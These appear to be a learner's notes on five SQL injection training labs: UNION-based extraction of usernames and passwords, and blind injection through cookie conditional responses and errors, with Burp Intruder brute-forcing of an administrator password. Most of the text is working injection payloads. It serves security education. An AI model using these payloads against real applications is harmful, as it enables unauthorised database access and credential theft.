1. Make the database retrieve the string: 'tWGj2h'; Find the column containing string
2. Retrieve data from other tables. Find users table and look for administrator password. 
3. Retreive multiple values in a single column. 
4. Blind SQL injection with conditional responses. Find injection vector, conditional response will respond true or false. Response was Welbcome Back
5. Blind SQL injection with conditional errors. If the SQL query causes an error, then the application returns a custom error message. 




1.
'--;Validate injection location
' ORDER BY 3--; validate column quanitity
' UNION SELECT NULL,'tWGj2h',NULL --; This was the answer and the second column is the number visually. Which would make you think non-string. Don't think you know things!
The second column of the query would actually show up in the first location which looked like words or strings. 

2.
category=' UNION SELECT username,password from users --%20
We couldn't find out the database on this one. Well not simply by quering to find DB and then tables. Simply queried username,password from users.

3. 
We are presented with a page that is one column of data. 
It is easy to skip steps when certain things don't work or you don't expect them. 
Oracle:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--;  Browser and Works from repeater which is after browser
' UNION SELECT NULL, username||'~'||password FROM users--; Browser   Only Browser. URL has to get encoded by browser.
You had to know string was second column and not the first. Lesson always generate a good select not with NULL if you are grabbing data. 
Microsot / MYSQL:
CONCAT ( string_value1, string_value2 [, string_valueN ] )

4.
So, when we inject anything into the get request URL nothing comes back but the welcome back. The clue here was the welcome back and the trackin id was the injection vector. 
Cookie: TrackingId=aaaaaaaaaaaaaaaa' and '1'='2; session=aaaaaaaaaaaaaaaaaaaaaaaaa     This gave us no welcome back
Cookie: TrackingId=aaaaaaaaaaaaaaaa' and '1'='1; session=aaaaaaaaaaaaaaaaaaaaaaaaa     This provided welcome back we have our injection vector. 
Cookie: TrackingId=aaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users LIMIT 1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   Provides welcome back, verifies table
Cookie: TrackingId=aaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM notusers LIMIT 1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Provides no welcome back, nerifies no table
TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator')='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, admin is there. 
TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, passowrd is > 1. May use intruder to guess
TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, passowrd is = 20
So, we know length and we know how to test if conditions are true, we now need to test is each charachter is true. Only Lower alpha to reserve time. 
Note:
For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, 
you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the "Cluster bomb" attack type,
and work through all permutations of offsets and character values. 
Beginner: This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
Put payload into intuder, "Clear §" button. 
"Clear §" button. 
Cookie: TrackingId=aaaaaaaaaaaa' AND (SELECT (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;
  High light a and select add §    You a then becomes §a§
  payloads, Type Brute Force.
  options, grep match Welcome back  don't use quotes as you might on linux
  Cookie: TrackingId=ACyfdDO0lU6oWNyk'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username%3d'administrator')%3d'§a§'--;
  Watched Michael Sommer who didn't use URL encoing must be using a BURP config to do that. 
  
  Now with Cluster Bomb attack to get it done with one and done:
  Attack Type in Intruder main page is Cluster bomb. Iterates through them both like a for in a for. 
    Ensure you have both Add S and the first one is the first payload, iterates first payload 1-20 with a, then 1-20 with b.
  
  5. 
Let's validate our injection point 
TrackingId=aaaaaaaaaaaaaaaaaaaaa' --; No error, count the word error on the page, or just look at page response 500 or not. I thought would be more challenging. But 500 is sufficient.
' AND (SELECT 'a' FROM users1 WHERE username1='administrator111')='a; table and user validation. I only get errors if selecting wrong table, or column but not if wrong username. 
Off on the wrong track and couldn't progress had to get hints from the lab page. But Why...?
TrackingId=xyz'||(SELECT '')||';    TrackingId=xyz'||(SELECT '' FROM dual)||'; TrackingId=xyz'||(SELECT '' FROM dual1)||'; validate error page expected for guide and Oracle.
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'; validate users
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; Validate that this does give us an error page.Case 1=1 so evaulaute 1/0 divide by zero error
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; This does not give us an error page, do not evaluate 1/0 becasue 1!=2
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual1)||'; This would also not present and error. 
The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true. 
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; If you get an error then admin exists. 
Is there a simpler method to find users? This is good lessons but COME ON MAN!
'||(SELECT 'a' FROM users WHERE username='administrator')||'; Would not work for username value as before the complex methdo is required. 
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' When user exist error, error when true statement before and after must be true for 1/0 to cause error
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator1')||' When user does not exist no error, When where doesn't evalaute is kind of like case 1=2, 
Simples thought is two negatives make a positive. 

Next we need to crack the password:
'||(SELECT CASE WHEN LENGTH(password)=§a§ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'; Cycle 1-30 When response error that is the length. From 505 at 20 we know 20. 
'||(SELECT CASE WHEN SUBSTR(password,1,1) THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
SUBSTR is the function from Oracle; SUBSTRING is the function from MySql
